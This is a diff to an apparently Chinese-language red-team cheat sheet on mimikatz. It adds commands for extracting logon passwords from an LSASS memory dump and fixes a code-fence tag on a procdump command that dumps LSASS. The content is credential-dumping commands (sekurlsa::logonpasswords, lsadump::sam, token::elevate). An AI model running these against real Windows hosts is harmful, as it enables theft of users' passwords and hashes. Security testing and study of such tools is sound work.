@@ -31,6 +31,10 @@ https://github.com/gentilkiwi/mimikatz/releases
 ```sh
 mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
 mimikatz.exe "log logon.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+
+# 从lsass.dmp内存 获取 password
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
 ```
 
 **1x 版本:**
@@ -103,7 +107,7 @@ https://www.daimajiaoliu.com/daima/486f56b9d900403
 
 procdump 导出
 
-```ts
+```sh
 procdump64.exe -accepteula -ma lsass.dmp
 mimikatz
 mimikatz # sekurlsa::minidump lsass.dmp
